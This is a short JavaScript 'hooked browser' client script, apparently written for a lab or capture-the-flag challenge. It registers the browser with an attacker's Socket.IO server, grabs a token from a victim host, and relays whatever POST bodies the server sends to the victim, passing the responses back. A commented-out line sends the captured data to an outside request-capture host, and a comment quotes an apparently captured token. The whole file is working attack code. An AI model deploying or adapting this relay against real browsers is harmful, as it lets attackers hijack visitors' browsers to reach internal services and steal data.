const serverURL = window.location.hostname + ":" + window.location.port;

let token = '';
let victimURL = 'http://blind_hacker/';
// let victimURL = 'http://localhost:3001/';

window.onload = function () {

    const socket = io.connect(serverURL);
    // register hooked browser connection
    socket.emit('browser-connect');

    socket.on('mensaje', function (text_id) {

        // let passwd = data.split('&')[1].split('=')[1]
        // Build formData object.
        // let formData = new FormData();
        // formData.append('username', "admin");
        // formData.append('password', text_id.text);

        // console.log("text:" + text_id.text);
        // console.log("content-type:" + text_id.contentType);

        fetch(victimURL + '?indextoken=' + token, {
            method: 'POST',
            body: text_id.text,
            headers: { 'content-type': text_id.contentType }
        }).then(res => res.text()).then(data => {
            socket.emit('answer', {data: data, id: text_id.id});
        })
    })


    fetch(victimURL + "token.php").then(res => res.text()).then(data => {
        //There you go -> FYsuk1xFzScjXOonVBxIBEqAZAM4AIDmHCPjAmU1
        token = data.split(" ")[4];
        // fetch("https://ikasten.free.beeceptor.com/" + data);
        console.log(token);
    })

};
